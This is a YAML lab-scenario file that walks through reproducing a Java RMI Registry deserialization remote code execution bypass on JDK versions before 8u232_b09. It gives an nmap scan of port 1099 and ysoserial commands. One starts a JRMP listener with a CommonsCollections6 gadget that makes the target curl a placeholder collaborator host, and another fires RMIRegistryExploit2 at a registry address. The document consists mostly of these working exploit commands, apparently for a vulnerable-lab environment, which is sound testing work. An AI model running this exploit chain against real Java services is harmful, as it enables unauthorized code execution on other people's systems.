access_instructions:
  title: Java < JDK8u232_b09 RMI Registry Deserialization Remote Code Execution Bypass
  steps:
  - title: Locate the target service
    instructions: |-
      Catalog TCP ports: 1099. Identify the exposed services:

      ```bash
      nmap -Pn -sT -sV -p 1099 {{NODE_IP}}
      ```

      Catalog port mappings (published → container): rmi: 1099/tcp → container 1099/tcp. These are recipe defaults; use the deployed service port if the scenario remaps it.
  - title: Vulnerability Reproduction
    instructions: |-
      Use RMIRegistryExploit2 or RMIRegistryExploit3 from ysoserial: https://github.com/wh1t3p1g/ysoserial's exploit package to perform the attack:

      ```bash
      # Start JRMPListener
      java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 8888 CommonsCollections6 "curl http://xxxxx.burpcollaborator.net"
      # Launch the attack
      java -cp target/ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.RMIRegistryExploit2 192.168.31.88 1099 jrmphost 8888
      ```

      Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/java/rmi-registry-bind-deserialization-bypass/1.png

      The Registry will return an error, but this is normal and the command will still execute successfully.
